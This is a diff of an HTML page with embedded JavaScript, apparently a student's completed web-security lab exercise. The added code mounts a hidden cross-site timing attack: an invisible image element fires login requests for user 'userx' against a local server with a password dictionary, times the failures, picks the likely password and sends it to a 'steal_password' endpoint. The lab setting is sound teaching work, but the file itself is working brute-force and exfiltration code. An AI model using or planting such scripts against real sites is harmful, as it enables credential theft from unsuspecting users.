@@ -1,29 +1,44 @@
 <span style='display:none'>
   <img id='test'/>
   <script>
-    var dictionary = [`password`, `123456`, `	12345678`, `dragon`, `1234`, `qwerty`, `12345`];
+    var dictionary = [`password`, `123456`, `	12345678`, `dragon`, `1234`, `qwerty`, `12345`,`one`];
     var index = 0;
     var test = document.getElementById(`test`);
+    let elapsed = []
     test.onerror = () => {
       var end = new Date();
 
       /* >>>> HINT: you might want to replace this line with something else. */
-      console.log(`Time elapsed ${end-start}`);
+      elapsed.push(end - start);
+      console.log(end-start)
       /* <<<<< */
 
       start = new Date();
       if (index < dictionary.length) {
         /* >>>> TODO: replace string with login GET request */
-        test.src = `hello!`;
+        test.src = `http://localhost:3000/get_login?username=userx&password=${dictionary[index]}`;
+        
         /* <<<< */
       } else {
         /* >>>> TODO: analyze server's reponse times to guess the password for userx and send your guess to the server <<<<< */
-      }
-      index += 1;
-    };
+        let indx = 1;
+        let diff = Math.abs(elapsed[1]-elapsed[0]);
+        for(let i=1;i<elapsed.length;i++){
+              if (Math.abs(elapsed[i]-elapsed[0]) < diff){
+                  diff = Math.abs(elapsed[i]-elapsed[0]);
+                  indx = i;
+              } 
+              
+          }
+        fetch(`http://localhost:3000/steal_password?password=${dictionary[indx]}&timeElapsed=${elapsed[indx]}`)
+        
+      
+    }
+    index += 1;
+  };
     var start = new Date();
     /* >>>> TODO: replace string with login GET request */
-    test.src = `hello!`;
+    test.src = `http://localhost:3000/get_login?username=attacker&password=evil`;
     /* <<<< */
     index += 1;
   </script>
